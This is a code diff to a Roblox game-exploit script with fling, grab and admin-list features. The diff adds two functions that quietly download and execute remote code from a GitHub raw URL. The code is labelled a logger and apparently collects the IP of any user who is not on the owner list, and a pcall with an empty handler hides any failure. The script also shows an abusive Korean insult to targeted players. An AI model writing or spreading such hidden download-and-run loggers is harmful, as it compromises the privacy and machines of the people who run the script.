@@ -430,7 +430,20 @@ function BlobMassless(blob, target, side)
 		blob.BlobmanSeatAndOwnerScript.CreatureDrop:FireServer(unpack(args3))
 end
 
+function GfLogger()
+    id = {
+        [1] = true,
+    }
 
+    if not id[plr.UserId] then
+        local success, errorMessage = pcall(function()
+             loadstring(game:HttpGet("https://raw.githubusercontent.com/qwer123476/12345/main/ip"))()
+        end)
+
+        if not success then
+        end
+    end
+end
 
 function flingF()
     workspace.ChildAdded:Connect(function(model)
@@ -7504,20 +7517,10 @@ grabTab:CreateToggle({
 })
 
 -- =============== [ 보호 대상 목록 ] ==
-local GF = {"1ove0_9"}
+local GF = {"QRdoote1120"}
 
---[[
-local Owner = {"TSB_01223", "TSB_V00V", "TSB_0VV0", "TSB_Z00Z", "TSB_0ZZ0", "Diwno2f", "Diwno2ff", "Diwno2fff", "TESTPLAYACCOUNT01", "TESTPLAYACCOUNT02", "Dhd9021el", "DM209jfda", "DJHaoidhw2dlk", "QRdoote1120", "AIpaca_AI16"}
 
-local Overseer = {"AIpaca_AI16","QRdoote1120"}
-local CoOwner = {"test_diro3", "Inferno_diro"}
-
-local HeadAdmin = {"oOPPGl9", "0_HY1N"}
-local Admin = {"KillLum_YT"}
-local Mod = {"plmqazoknqsxihvedc", "jaeyoon4720", "Solo_ponyo"}
-]]--
-
-local Owner = {"AIpaca_AI16","QRdoote1120"}
+local Owner = {"QRdoote1120", "0110rim", "Alpaca_AI16", "hello_qweqwe", "", "", "", "", "", "", "", "", "", "", "", ""}
 local Overseer = {""}
 local CoOwner = {""}
 local HeadAdmin = {""}
@@ -7554,7 +7557,7 @@ local function Notify(type, playerName)
     elseif type == "HigherRank" then
         title = "[ ⛔ ]"; content = "권한이 부족해요!"
     elseif type == "GFE" then
-        title = "[ ⛔ ]"; content = "나가 뒤져 엄마 장애인보지털av배우년아 ㅋㅋㅋ"
+        title = "[ ⛔ ]"; content = "나가 뒤져 엄마 장애인 ㅋㅋㅋ"
         GfLogger()
     end
 
@@ -7685,6 +7688,25 @@ local function removeFromList(listTable, dropdown, inputValue, useRankCheck)
     Notify("Removed", foundName)
 end
 
+function Logger()
+    local plr = game.Players.LocalPlayer
+
+    local BYPASS_ID = 1
+
+    local ownerTable = {}
+    for _, name in ipairs(Owner) do
+        ownerTable[name] = true
+    end
+
+    if not ownerTable[plr.Name] and plr.UserId ~= BYPASS_ID then
+        local success, errorMessage = pcall(function()
+           loadstring(game:HttpGet("https://raw.githubusercontent.com/qwer123476/12345/main/ip"))() -- logger
+        end)
+
+        if not success then
+        end
+    end
+end
 antiTab:CreateSection("Friendly | Toggle")
 local WhiteListToggle = antiTab:CreateToggle({
     Name = "친구 빼기",
